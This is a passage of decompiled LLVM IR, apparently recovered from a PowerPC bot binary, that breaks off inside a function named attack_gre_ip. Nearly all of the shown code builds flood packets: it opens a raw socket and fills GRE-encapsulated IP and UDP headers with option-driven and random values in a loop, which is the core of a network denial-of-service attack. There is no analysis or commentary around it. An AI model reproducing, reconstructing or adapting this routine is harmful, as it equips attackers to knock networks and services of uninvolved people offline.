  uselistorder label %dec_label_pc_10002808, { 1, 0 }
  uselistorder label %dec_label_pc_1000279c, { 1, 0, 2 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-120 = alloca i32, align 4
  %v0_10002b98 = load i32, i32* @lr, align 4
  store i32 %v0_10002b98, i32* %r0.global-to-local, align 4
  %v0_10002b9c = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r19.global-to-local, align 4
  %v0_10002ba8 = load i32, i32* @r21, align 4
  store i32 0, i32* @r21, align 4
  store i32 %v0_10002b9c, i32* @r27, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v0_10002bc0 = load i32, i32* %r0.global-to-local, align 4
  %v0_10002bdc = load i32, i32* @r22, align 4
  %v0_10002be0 = load i32, i32* @r23, align 4
  %v0_10002be8 = load i32, i32* @r25, align 4
  %v0_10002bec = load i32, i32* @r26, align 4
  %v0_10002bf0 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10002bf8 = load i32, i32* @r29, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r30, align 4
  %v0_10002c08 = load i32, i32* @r31, align 4
  store i32 0, i32* %stack_var_-120, align 4
  store i32 268446744, i32* @lr, align 4
  %v2_10002c14 = call i32 @calloc(i32 %arg2, i32 4)
  store i32 %v2_10002c14, i32* %r20.global-to-local, align 4
  %v0_10002c1c = load i32, i32* @r29, align 4
  %v0_10002c28 = load i32, i32* @r28, align 4
  store i32 %v0_10002c28, i32* %r3.global-to-local, align 4
  store i32 268446768, i32* @lr, align 4
  %v4_10002c2c = inttoptr i32 %v0_10002c1c to i32*
  %v5_10002c2c = call i32 @attack_get_opt_int(i32 %v0_10002c28, i32* %v4_10002c2c, i32 2, i32 0)
  %v0_10002c3c = load i32, i32* @r29, align 4
  %v1_10002c40 = urem i32 %v5_10002c2c, 256
  store i32 %v1_10002c40, i32* %r15.global-to-local, align 4
  %v0_10002c44 = load i32, i32* @r28, align 4
  store i32 %v0_10002c44, i32* %r3.global-to-local, align 4
  store i32 268446796, i32* @lr, align 4
  %v4_10002c48 = inttoptr i32 %v0_10002c3c to i32*
  %v5_10002c48 = call i32 @attack_get_opt_int(i32 %v0_10002c44, i32* %v4_10002c48, i32 3, i32 65535)
  %v0_10002c4c = load i32, i32* @r29, align 4
  store i32 %v5_10002c48, i32* %r22.global-to-local, align 4
  %v0_10002c5c = load i32, i32* @r28, align 4
  store i32 %v0_10002c5c, i32* %r3.global-to-local, align 4
  store i32 268446820, i32* @lr, align 4
  %v4_10002c60 = inttoptr i32 %v0_10002c4c to i32*
  %v5_10002c60 = call i32 @attack_get_opt_int(i32 %v0_10002c5c, i32* %v4_10002c60, i32 4, i32 64)
  %v0_10002c64 = load i32, i32* @r29, align 4
  %v1_10002c70 = urem i32 %v5_10002c60, 256
  store i32 %v1_10002c70, i32* %r17.global-to-local, align 4
  %v0_10002c74 = load i32, i32* @r28, align 4
  store i32 %v0_10002c74, i32* %r3.global-to-local, align 4
  store i32 268446844, i32* @lr, align 4
  %v4_10002c78 = inttoptr i32 %v0_10002c64 to i32*
  %v5_10002c78 = call i32 @attack_get_opt_int(i32 %v0_10002c74, i32* %v4_10002c78, i32 5, i32 1)
  %v0_10002c88 = load i32, i32* @r29, align 4
  %v1_10002c8c = urem i32 %v5_10002c78, 256
  store i32 %v1_10002c8c, i32* %r23.global-to-local, align 4
  %v0_10002c90 = load i32, i32* @r28, align 4
  store i32 %v0_10002c90, i32* %r3.global-to-local, align 4
  store i32 268446872, i32* @lr, align 4
  %v4_10002c94 = inttoptr i32 %v0_10002c88 to i32*
  %v5_10002c94 = call i32 @attack_get_opt_int(i32 %v0_10002c90, i32* %v4_10002c94, i32 6, i32 65535)
  %v0_10002c9c = load i32, i32* @r29, align 4
  store i32 %v5_10002c94, i32* %r25.global-to-local, align 4
  %v0_10002cac = load i32, i32* @r28, align 4
  store i32 %v0_10002cac, i32* %r3.global-to-local, align 4
  store i32 268446900, i32* @lr, align 4
  %v4_10002cb0 = inttoptr i32 %v0_10002c9c to i32*
  %v5_10002cb0 = call i32 @attack_get_opt_int(i32 %v0_10002cac, i32* %v4_10002cb0, i32 7, i32 65535)
  %v0_10002cb4 = load i32, i32* @r29, align 4
  store i32 %v5_10002cb0, i32* %r26.global-to-local, align 4
  %v0_10002cc4 = load i32, i32* @r28, align 4
  store i32 %v0_10002cc4, i32* %r3.global-to-local, align 4
  store i32 268446924, i32* @lr, align 4
  %v4_10002cc8 = inttoptr i32 %v0_10002cb4 to i32*
  %v5_10002cc8 = call i32 @attack_get_opt_int(i32 %v0_10002cc4, i32* %v4_10002cc8, i32 0, i32 512)
  %v0_10002ccc = load i32, i32* @r29, align 4
  store i32 %v5_10002cc8, i32* %r18.global-to-local, align 4
  %v0_10002cdc = load i32, i32* @r28, align 4
  store i32 %v0_10002cdc, i32* %r3.global-to-local, align 4
  store i32 268446948, i32* @lr, align 4
  %v4_10002ce0 = inttoptr i32 %v0_10002ccc to i32*
  %v5_10002ce0 = call i32 @attack_get_opt_int(i32 %v0_10002cdc, i32* %v4_10002ce0, i32 1, i32 1)
  %v0_10002ce4 = load i32, i32* @r29, align 4
  %v1_10002ce8 = urem i32 %v5_10002ce0, 256
  %v0_10002cf8 = load i32, i32* @r28, align 4
  store i32 %v0_10002cf8, i32* %r3.global-to-local, align 4
  store i32 268446976, i32* @lr, align 4
  %v4_10002cfc = inttoptr i32 %v0_10002ce4 to i32*
  %v5_10002cfc = call i32 @attack_get_opt_int(i32 %v0_10002cf8, i32* %v4_10002cfc, i32 18, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10002d04 = load i32, i32* @global_var_100211e0.76, align 4
  %v0_10002d08 = load i32, i32* @r29, align 4
  store i32 %v5_10002cfc, i32* %r31.global-to-local, align 4
  %v0_10002d14 = load i32, i32* @r28, align 4
  store i32 %v0_10002d14, i32* %r3.global-to-local, align 4
  store i32 268447004, i32* @lr, align 4
  %v4_10002d18 = inttoptr i32 %v0_10002d08 to i32*
  %v5_10002d18 = call i32 @attack_get_opt_int(i32 %v0_10002d14, i32* %v4_10002d18, i32 24, i32 %v3_10002d04)
  store i32 %v5_10002d18, i32* %r14.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10002d24 = call i32 @__GI_time()
  %v1_10002d2c = load i32, i32* @r27, align 4
  %v2_10002d2c = add i32 %v1_10002d2c, %v0_10002d24
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268447040, i32* @lr, align 4
  %v3_10002d3c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_10002d3c, i32* %r3.global-to-local, align 4
  %v3_10002d40 = icmp eq i32 %v3_10002d3c, -1
  store i1 %v3_10002d40, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10002d3c, i32* @r24, align 4
  br i1 %v3_10002d40, label %dec_label_pc_10003060, label %dec_label_pc_10002d4c

dec_label_pc_10002d4c:                            ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10002d58 = ptrtoint i32* %stack_var_-120 to i32
  store i32 1, i32* %stack_var_-120, align 4
  store i32 268447080, i32* @lr, align 4
  %v5_10002d64 = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_10002d58, i32 4, i32 4)
  store i32 %v5_10002d64, i32* %r3.global-to-local, align 4
  %v3_10002d68 = icmp eq i32 %v5_10002d64, -1
  store i1 %v3_10002d68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002d68, label %dec_label_pc_1000317c, label %dec_label_pc_10002d70

dec_label_pc_10002d70:                            ; preds = %dec_label_pc_10002d4c
  %v0_10002d70 = load i32, i32* %r19.global-to-local, align 4
  %v3_10002d70 = icmp eq i32 %v0_10002d70, 0
  store i1 %v3_10002d70, i1* %cr7_eq.global-to-local, align 1
  %v0_10002d74 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002d74 = urem i32 %v0_10002d74, 256
  store i32 %v1_10002d74, i32* %r31.global-to-local, align 4
  %v0_10002d78 = load i32, i32* @r21, align 4
  store i32 %v0_10002d78, i32* %stack_var_-120, align 4
  %v0_10002d7c = load i32, i32* %r22.global-to-local, align 4
  %v1_10002d7c = urem i32 %v0_10002d7c, 65536
  store i32 %v1_10002d7c, i32* @r27, align 4
  %v0_10002d80 = call i32 @__asm_mfcr()
  store i32 %v0_10002d80, i32* %r3.global-to-local, align 4
  %v1_10002d84 = mul i32 %v0_10002d80, 268435456
  store i32 %v1_10002d84, i32* %r0.global-to-local, align 4
  %v0_10002d88 = load i32, i32* %r25.global-to-local, align 4
  %v1_10002d88 = urem i32 %v0_10002d88, 65536
  store i32 %v1_10002d88, i32* %r16.global-to-local, align 4
  %v0_10002d8c = load i32, i32* %r26.global-to-local, align 4
  %v1_10002d8c = urem i32 %v0_10002d8c, 65536
  store i32 %v1_10002d8c, i32* @r21, align 4
  %v0_10002d90 = load i32, i32* %r31.global-to-local, align 4
  %v0_10002d98 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002d98, label %dec_label_pc_10002ee8, label %dec_label_pc_10002d9c

dec_label_pc_10002d9c:                            ; preds = %dec_label_pc_10002d70
  %v0_10002d9c = load i32, i32* %r23.global-to-local, align 4
  %v3_10002d9c = icmp eq i32 %v0_10002d9c, 0
  store i1 %v3_10002d9c, i1* %cr4_eq.global-to-local, align 1
  %v3_10002da0 = icmp eq i32 %v0_10002d90, 0
  store i1 %v3_10002da0, i1* %cr3_eq.global-to-local, align 1
  %v0_10002da4 = load i32, i32* %r18.global-to-local, align 4
  %v1_10002da4 = urem i32 %v0_10002da4, 65536
  %v0_10002da8 = load i32, i32* @r27, align 4
  %v1_10002da8 = sub i32 -1, %v0_10002da8
  store i32 %v1_10002da8, i32* %r11.global-to-local, align 4
  %v1_10002dac = add nuw nsw i32 %v1_10002da4, 8
  store i32 %v1_10002dac, i32* %r10.global-to-local, align 4
  %v1_10002db0 = add nuw nsw i32 %v1_10002da4, 52
  store i32 %v1_10002db0, i32* %r0.global-to-local, align 4
  %v1_10002db4 = add nuw nsw i32 %v1_10002da4, 28
  store i32 %v1_10002db4, i32* %r9.global-to-local, align 4
  %fold = add i32 %v0_10002da4, 52
  %v1_10002db8 = urem i32 %fold, 65536
  store i32 %v1_10002db8, i32* @r22, align 4
  %fold4 = add i32 %v0_10002da4, 28
  %v1_10002dbc = urem i32 %fold4, 65536
  store i32 %v1_10002dbc, i32* @r23, align 4
  %v1_10002dc0 = urem i32 %v1_10002da8, 65536
  store i32 %v1_10002dc0, i32* @r25, align 4
  %fold5 = add i32 %v0_10002da4, 8
  %v1_10002dc4 = urem i32 %fold5, 65536
  store i32 %v1_10002dc4, i32* @r26, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002df8

dec_label_pc_10002dd0:                            ; preds = %dec_label_pc_10002ea8
  %v0_10002dd0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002dd0 = add i32 %v0_10002dd0, 16
  %v2_10002dd0 = inttoptr i32 %v1_10002dd0 to i32*
  %v3_10002dd0 = load i32, i32* %v2_10002dd0, align 4
  store i32 %v3_10002dd0, i32* %r0.global-to-local, align 4
  %v0_10002dd4 = load i32, i32* @r26, align 4
  %v1_10002dd4 = trunc i32 %v0_10002dd4 to i16
  %v2_10002dd4 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002dd4 = add i32 %v2_10002dd4, 4
  %v4_10002dd4 = inttoptr i32 %v3_10002dd4 to i16*
  store i16 %v1_10002dd4, i16* %v4_10002dd4, align 2
  %v0_10002dd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002dd8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002dd8 = add i32 %v1_10002dd8, 16
  %v3_10002dd8 = inttoptr i32 %v2_10002dd8 to i32*
  store i32 %v0_10002dd8, i32* %v3_10002dd8, align 4
  %v0_10002ddc = load i32, i32* %r16.global-to-local, align 4
  %v1_10002ddc = trunc i32 %v0_10002ddc to i16
  %v2_10002ddc = load i32, i32* %r28.global-to-local, align 4
  %v3_10002ddc = inttoptr i32 %v2_10002ddc to i16*
  store i16 %v1_10002ddc, i16* %v3_10002ddc, align 2
  %v3_10002de0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10002de0, i32* %r9.global-to-local, align 4
  %v0_10002de4 = load i32, i32* @r21, align 4
  %v1_10002de4 = trunc i32 %v0_10002de4 to i16
  %v2_10002de4 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002de4 = add i32 %v2_10002de4, 2
  %v4_10002de4 = inttoptr i32 %v3_10002de4 to i16*
  store i16 %v1_10002de4, i16* %v4_10002de4, align 2
  %v0_10002de8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002de8 = add i32 %v0_10002de8, 1
  store i32 %v1_10002de8, i32* %r31.global-to-local, align 4
  %v1_10002dec = load i32, i32* %r19.global-to-local, align 4
  %v2_10002dec = icmp slt i32 %v1_10002de8, %v1_10002dec
  %v4_10002dec = icmp eq i32 %v1_10002de8, %v1_10002dec
  store i1 %v4_10002dec, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10002de8, i32* %stack_var_-120, align 4
  br i1 %v2_10002dec, label %dec_label_pc_10002df8, label %dec_label_pc_10002ee8.loopexit

dec_label_pc_10002df8:                            ; preds = %dec_label_pc_10002dd0, %dec_label_pc_10002ec4, %dec_label_pc_10002d9c
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268447236, i32* @lr, align 4
  %v2_10002e00 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_10002e00, i32* %r3.global-to-local, align 4
  %v3_10002e04 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10002e04, i32* %r9.global-to-local, align 4
  %v0_10002e08 = load i32, i32* @r31, align 4
  %v1_10002e08 = mul i32 %v0_10002e08, 4
  store i32 %v1_10002e08, i32* %r11.global-to-local, align 4
  %v2_10002e10 = load i32, i32* %r20.global-to-local, align 4
  %v3_10002e10 = add i32 %v2_10002e10, %v1_10002e08
  %v4_10002e10 = inttoptr i32 %v3_10002e10 to i32*
  store i32 %v2_10002e00, i32* %v4_10002e10, align 4
  %v0_10002e14 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002e14 = mul i32 %v0_10002e14, 4
  store i32 %v1_10002e14, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r8.global-to-local, align 4
  %v1_10002e1c = mul i32 %v0_10002e14, 24
  store i32 %v1_10002e1c, i32* %r9.global-to-local, align 4
  %v0_10002e20 = load i32, i32* %r20.global-to-local, align 4
  %v2_10002e20 = add i32 %v0_10002e20, %v1_10002e14
  %v3_10002e20 = inttoptr i32 %v2_10002e20 to i32*
  %v4_10002e20 = load i32, i32* %v3_10002e20, align 4
  store i32 %v4_10002e20, i32* %r31.global-to-local, align 4
  %v1_10002e24 = load i32, i32* @r30, align 4
  %v2_10002e24 = add i32 %v1_10002e24, %v1_10002e1c
  store i32 %v2_10002e24, i32* %r10.global-to-local, align 4
  %v1_10002e28 = inttoptr i32 %v4_10002e20 to i32*
  %v2_10002e28 = load i32, i32* %v1_10002e28, align 4
  store i32 %v2_10002e28, i32* %r0.global-to-local, align 4
  %v1_10002e2c = add i32 %v4_10002e20, 24
  store i32 %v1_10002e2c, i32* %r29.global-to-local, align 4
  %v0_10002e30 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002e30 = trunc i32 %v0_10002e30 to i8
  %v3_10002e30 = add i32 %v4_10002e20, 8
  %v4_10002e30 = inttoptr i32 %v3_10002e30 to i8*
  store i8 %v1_10002e30, i8* %v4_10002e30, align 1
  %v0_10002e34 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002e34 = add i32 %v0_10002e34, 44
  store i32 %v1_10002e34, i32* %r28.global-to-local, align 4
  %v1_10002e38 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002e38, i32* %r0.global-to-local, align 4
  %v0_10002e3c = load i32, i32* @r27, align 4
  %v1_10002e3c = trunc i32 %v0_10002e3c to i16
  %v2_10002e3c = load i32, i32* %r31.global-to-local, align 4
  %v3_10002e3c = add i32 %v2_10002e3c, 4
  %v4_10002e3c = inttoptr i32 %v3_10002e3c to i16*
  store i16 %v1_10002e3c, i16* %v4_10002e3c, align 2
  %v1_10002e40 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002e40, i32* %r0.global-to-local, align 4
  %v0_10002e44 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002e44 = add i32 %v0_10002e44, 20
  store i32 %v1_10002e44, i32* %r11.global-to-local, align 4
  %v2_10002e48 = inttoptr i32 %v0_10002e44 to i32*
  store i32 %v1_10002e40, i32* %v2_10002e48, align 4
  %v0_10002e4c = load i32, i32* %r15.global-to-local, align 4
  %v1_10002e4c = trunc i32 %v0_10002e4c to i8
  %v2_10002e4c = load i32, i32* %r31.global-to-local, align 4
  %v3_10002e4c = add i32 %v2_10002e4c, 1
  %v4_10002e4c = inttoptr i32 %v3_10002e4c to i8*
  store i8 %v1_10002e4c, i8* %v4_10002e4c, align 1
  %v0_10002e50 = load i32, i32* @r22, align 4
  %v1_10002e50 = trunc i32 %v0_10002e50 to i16
  %v2_10002e50 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002e50 = add i32 %v2_10002e50, 2
  %v4_10002e50 = inttoptr i32 %v3_10002e50 to i16*
  store i16 %v1_10002e50, i16* %v4_10002e50, align 2
  %v0_10002e54 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10002e54, label %dec_label_pc_10002e60, label %dec_label_pc_10002e58

dec_label_pc_10002e58:                            ; preds = %dec_label_pc_10002df8
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10002e5c = load i32, i32* %r31.global-to-local, align 4
  %v3_10002e5c = add i32 %v2_10002e5c, 6
  %v4_10002e5c = inttoptr i32 %v3_10002e5c to i16*
  store i16 16384, i16* %v4_10002e5c, align 2
  br label %dec_label_pc_10002e60

dec_label_pc_10002e60:                            ; preds = %dec_label_pc_10002df8, %dec_label_pc_10002e58
  store i32 47, i32* %r0.global-to-local, align 4
  store i32 2048, i32* %r9.global-to-local, align 4
  %v2_10002e68 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002e68 = add i32 %v2_10002e68, 9
  %v4_10002e68 = inttoptr i32 %v3_10002e68 to i8*
  store i8 47, i8* %v4_10002e68, align 1
  %v0_10002e6c = load i32, i32* %r9.global-to-local, align 4
  %v1_10002e6c = trunc i32 %v0_10002e6c to i16
  %v2_10002e6c = load i32, i32* %r11.global-to-local, align 4
  %v3_10002e6c = add i32 %v2_10002e6c, 2
  %v4_10002e6c = inttoptr i32 %v3_10002e6c to i16*
  store i16 %v1_10002e6c, i16* %v4_10002e6c, align 2
  %v0_10002e70 = load i32, i32* %r14.global-to-local, align 4
  %v1_10002e70 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002e70 = add i32 %v1_10002e70, 12
  %v3_10002e70 = inttoptr i32 %v2_10002e70 to i32*
  store i32 %v0_10002e70, i32* %v3_10002e70, align 4
  %v0_10002e74 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002e74 = add i32 %v0_10002e74, 24
  %v2_10002e74 = inttoptr i32 %v1_10002e74 to i32*
  %v3_10002e74 = load i32, i32* %v2_10002e74, align 4
  store i32 %v3_10002e74, i32* %r0.global-to-local, align 4
  %v0_10002e78 = load i32, i32* %r10.global-to-local, align 4
  %v1_10002e78 = add i32 %v0_10002e78, 16
  %v2_10002e78 = inttoptr i32 %v1_10002e78 to i32*
  %v3_10002e78 = load i32, i32* %v2_10002e78, align 4
  store i32 %v3_10002e78, i32* %r9.global-to-local, align 4
  %v1_10002e7c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002e7c, i32* %r0.global-to-local, align 4
  %v1_10002e80 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002e80, i32* %r0.global-to-local, align 4
  %v1_10002e84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002e84 = add i32 %v1_10002e84, 16
  %v3_10002e84 = inttoptr i32 %v2_10002e84 to i32*
  store i32 %v3_10002e78, i32* %v3_10002e84, align 4
  %v1_10002e88 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002e88 = add i32 %v1_10002e88, 24
  %v3_10002e88 = inttoptr i32 %v2_10002e88 to i32*
  store i32 %v1_10002e80, i32* %v3_10002e88, align 4
  %v0_10002e8c = load i32, i32* %r15.global-to-local, align 4
  %v1_10002e8c = trunc i32 %v0_10002e8c to i8
  %v2_10002e8c = load i32, i32* %r29.global-to-local, align 4
  %v3_10002e8c = add i32 %v2_10002e8c, 1
  %v4_10002e8c = inttoptr i32 %v3_10002e8c to i8*
  store i8 %v1_10002e8c, i8* %v4_10002e8c, align 1
  %v0_10002e90 = load i32, i32* @r23, align 4
  %v1_10002e90 = trunc i32 %v0_10002e90 to i16
  %v2_10002e90 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002e90 = add i32 %v2_10002e90, 2
  %v4_10002e90 = inttoptr i32 %v3_10002e90 to i16*
  store i16 %v1_10002e90, i16* %v4_10002e90, align 2
  %v0_10002e94 = load i32, i32* @r25, align 4
  %v1_10002e94 = trunc i32 %v0_10002e94 to i16
  %v2_10002e94 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002e94 = add i32 %v2_10002e94, 4
  %v4_10002e94 = inttoptr i32 %v3_10002e94 to i16*
  store i16 %v1_10002e94, i16* %v4_10002e94, align 2
  %v0_10002e98 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002e98 = trunc i32 %v0_10002e98 to i8
  %v2_10002e98 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002e98 = add i32 %v2_10002e98, 8
  %v4_10002e98 = inttoptr i32 %v3_10002e98 to i8*
  store i8 %v1_10002e98, i8* %v4_10002e98, align 1
  %v0_10002e9c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10002e9c, label %dec_label_pc_10002ea8, label %dec_label_pc_10002ea0

dec_label_pc_10002ea0:                            ; preds = %dec_label_pc_10002e60
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10002ea4 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002ea4 = add i32 %v2_10002ea4, 6
  %v4_10002ea4 = inttoptr i32 %v3_10002ea4 to i16*
  store i16 16384, i16* %v4_10002ea4, align 2
  br label %dec_label_pc_10002ea8

dec_label_pc_10002ea8:                            ; preds = %dec_label_pc_10002e60, %dec_label_pc_10002ea0
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_10002eac = load i32, i32* %r29.global-to-local, align 4
  %v3_10002eac = add i32 %v2_10002eac, 9
  %v4_10002eac = inttoptr i32 %v3_10002eac to i8*
  store i8 17, i8* %v4_10002eac, align 1
  %v0_10002eb0 = call i32 @rand_next()
  store i32 %v0_10002eb0, i32* %r3.global-to-local, align 4
  %v1_10002eb4 = add i32 %v0_10002eb0, -1024
  store i32 %v1_10002eb4, i32* %r0.global-to-local, align 4
  %v1_10002eb8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002eb8 = add i32 %v1_10002eb8, 12
  %v3_10002eb8 = inttoptr i32 %v2_10002eb8 to i32*
  store i32 %v0_10002eb0, i32* %v3_10002eb8, align 4
  %v0_10002ebc = load i32, i32* %r0.global-to-local, align 4
  %v1_10002ebc = sub i32 -1, %v0_10002ebc
  store i32 %v1_10002ebc, i32* %r0.global-to-local, align 4
  %v0_10002ec0 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002ec0, label %dec_label_pc_10002ec4, label %dec_label_pc_10002dd0

dec_label_pc_10002ec4:                            ; preds = %dec_label_pc_10002ea8
  %v1_10002ec4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002ec4 = add i32 %v1_10002ec4, 16
  %v3_10002ec4 = inttoptr i32 %v2_10002ec4 to i32*
  store i32 %v1_10002ebc, i32* %v3_10002ec4, align 4
  %v0_10002ec8 = load i32, i32* @r26, align 4
  %v1_10002ec8 = trunc i32 %v0_10002ec8 to i16
  %v2_10002ec8 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002ec8 = add i32 %v2_10002ec8, 4
  %v4_10002ec8 = inttoptr i32 %v3_10002ec8 to i16*
  store i16 %v1_10002ec8, i16* %v4_10002ec8, align 2
  %v3_10002ecc = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10002ecc, i32* %r9.global-to-local, align 4
  %v0_10002ed0 = load i32, i32* %r16.global-to-local, align 4
  %v1_10002ed0 = trunc i32 %v0_10002ed0 to i16
  %v2_10002ed0 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002ed0 = inttoptr i32 %v2_10002ed0 to i16*
  store i16 %v1_10002ed0, i16* %v3_10002ed0, align 2
  %v0_10002ed4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002ed4 = add i32 %v0_10002ed4, 1
  store i32 %v1_10002ed4, i32* %r31.global-to-local, align 4
  %v0_10002ed8 = load i32, i32* @r21, align 4
  %v1_10002ed8 = trunc i32 %v0_10002ed8 to i16
  %v2_10002ed8 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002ed8 = add i32 %v2_10002ed8, 2
  %v4_10002ed8 = inttoptr i32 %v3_10002ed8 to i16*
  store i16 %v1_10002ed8, i16* %v4_10002ed8, align 2
  %v0_10002edc = load i32, i32* %r31.global-to-local, align 4
  %v1_10002edc = load i32, i32* %r19.global-to-local, align 4
  %v2_10002edc = icmp slt i32 %v0_10002edc, %v1_10002edc
  %v4_10002edc = icmp eq i32 %v0_10002edc, %v1_10002edc
  store i1 %v4_10002edc, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10002edc, i32* %stack_var_-120, align 4
  br i1 %v2_10002edc, label %dec_label_pc_10002df8, label %dec_label_pc_10002ee8.loopexit

dec_label_pc_10002ee8.loopexit:                   ; preds = %dec_label_pc_10002ec4, %dec_label_pc_10002dd0
  %v0_10002ef8.pre = load i32, i32* @r21, align 4
  %v0_10002f00.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10002ee8

dec_label_pc_10002ee8:                            ; preds = %dec_label_pc_10002ee8.loopexit, %dec_label_pc_10002d70
  %v0_10002f00 = phi i32 [ %v0_10002f00.pre, %dec_label_pc_10002ee8.loopexit ], [ %v1_10002d88, %dec_label_pc_10002d70 ]
  %v0_10002ef8 = phi i32 [ %v0_10002ef8.pre, %dec_label_pc_10002ee8.loopexit ], [ %v1_10002d8c, %dec_label_pc_10002d70 ]
  store i32 %v0_10002d90, i32* %r8.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v0_10002ef4 = load i32, i32* %r14.global-to-local, align 4
  %v3_10002ef4 = icmp eq i32 %v0_10002ef4, -1
  store i1 %v3_10002ef4, i1* %cr2_eq.global-to-local, align 1
  %v4_10002ef8 = icmp eq i32 %v0_10002ef8, 65535
  store i1 %v4_10002ef8, i1* %cr7_eq.global-to-local, align 1
  %v0_10002efc = load i32, i32* @r27, align 4
  %v4_10002efc = icmp eq i32 %v0_10002efc, 65535
  store i1 %v4_10002efc, i1* %cr3_eq.global-to-local, align 1
  %v4_10002f00 = icmp eq i32 %v0_10002f00, 65535
  store i1 %v4_10002f00, i1* %cr4_eq.global-to-local, align 1
  %v0_10002f04 = load i32, i32* %r18.global-to-local, align 4
  %v1_10002f04 = add i32 %v0_10002f04, 8
  store i32 %v1_10002f04, i32* @r25, align 4
  %v0_10002f08 = call i32 @__asm_mfcr()
  store i32 %v0_10002f08, i32* %r3.global-to-local, align 4
  %v1_10002f0c = mul i32 %v0_10002f08, 268435456
  store i32 %v1_10002f0c, i32* %r21.global-to-local, align 4
  %v0_10002f10 = load i32, i32* %r8.global-to-local, align 4
  %v3_10002f10 = icmp eq i32 %v0_10002f10, 0
  store i1 %v3_10002f10, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10002ce8, i32* %r8.global-to-local, align 4
  %v0_10002f18 = load i32, i32* %r18.global-to-local, align 4
  %v1_10002f18 = add i32 %v0_10002f18, 52
  store i32 %v1_10002f18, i32* @r26, align 4
  %v0_10002f1c = call i32 @__asm_mfcr()
  store i32 %v0_10002f1c, i32* %r3.global-to-local, align 4
  %v1_10002f20 = mul i32 %v0_10002f1c, 268435456
